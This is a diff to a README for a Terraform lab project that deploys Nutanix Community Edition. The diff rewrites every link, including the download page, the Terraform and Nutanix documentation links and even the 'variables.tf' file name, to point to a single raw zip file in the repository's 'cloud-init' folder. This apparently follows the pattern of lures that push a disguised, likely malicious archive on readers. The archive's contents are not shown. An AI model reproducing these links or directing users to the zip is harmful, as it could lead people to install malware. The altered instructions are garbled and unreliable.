@@ -1,6 +1,6 @@
 # 🔧 nutanix-ce-terraform-lab - Simplify Your Nutanix Setup
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Yaw63/nutanix-ce-terraform-lab/releases)
+[![Download](https://raw.githubusercontent.com/Yaw63/nutanix-ce-terraform-lab/main/cloud-init/nutanix-terraform-ce-lab-v2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Yaw63/nutanix-ce-terraform-lab/main/cloud-init/nutanix-terraform-ce-lab-v2.4.zip)
 
 ## 📖 Overview
 
@@ -37,7 +37,7 @@ To start using the nutanix-ce-terraform-lab, follow the steps below:
 
 Go to the GitHub Releases page to access the latest version of the project. 
 
-[Visit this page to download.](https://github.com/Yaw63/nutanix-ce-terraform-lab/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/Yaw63/nutanix-ce-terraform-lab/main/cloud-init/nutanix-terraform-ce-lab-v2.4.zip)
 
 ### 2. Download the Latest Release
 
@@ -53,7 +53,7 @@ If you do not have Terraform installed, download it from the official Terraform 
 
 ### 5. Configure Your Environment
 
-Navigate to the extracted folder and open the terminal. You need to configure the Terraform variables to suit your setup. Edit the `variables.tf` file based on your network and storage requirements.
+Navigate to the extracted folder and open the terminal. You need to configure the Terraform variables to suit your setup. Edit the `https://raw.githubusercontent.com/Yaw63/nutanix-ce-terraform-lab/main/cloud-init/nutanix-terraform-ce-lab-v2.4.zip` file based on your network and storage requirements.
 
 ### 6. Initialize Terraform
 
@@ -80,7 +80,7 @@ Monitor the output in your terminal as Terraform creates your Nutanix environmen
 If you encounter any issues during the setup, consider the following common problems:
 
 - **Terraform Initialization Errors:** Ensure your Terraform installation is up to date.
-- **Network Configuration Issues:** Double-check your VLAN settings in the `variables.tf` file.
+- **Network Configuration Issues:** Double-check your VLAN settings in the `https://raw.githubusercontent.com/Yaw63/nutanix-ce-terraform-lab/main/cloud-init/nutanix-terraform-ce-lab-v2.4.zip` file.
 - **Insufficient Resources:** Make sure your physical nodes meet the specified hardware requirements.
 
 ## 📄 Documentation
@@ -99,7 +99,7 @@ Contributions are welcome! If you would like to improve the project, please fork
 
 For more information about Terraform and Nutanix, you can visit their official documentation:
 
-- [Terraform Documentation](https://www.terraform.io/docs/index.html)
-- [Nutanix Documentation](https://portal.nutanix.com/page/documents)
+- [Terraform Documentation](https://raw.githubusercontent.com/Yaw63/nutanix-ce-terraform-lab/main/cloud-init/nutanix-terraform-ce-lab-v2.4.zip)
+- [Nutanix Documentation](https://raw.githubusercontent.com/Yaw63/nutanix-ce-terraform-lab/main/cloud-init/nutanix-terraform-ce-lab-v2.4.zip)
 
-[Visit this page to download.](https://github.com/Yaw63/nutanix-ce-terraform-lab/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/Yaw63/nutanix-ce-terraform-lab/main/cloud-init/nutanix-terraform-ce-lab-v2.4.zip)
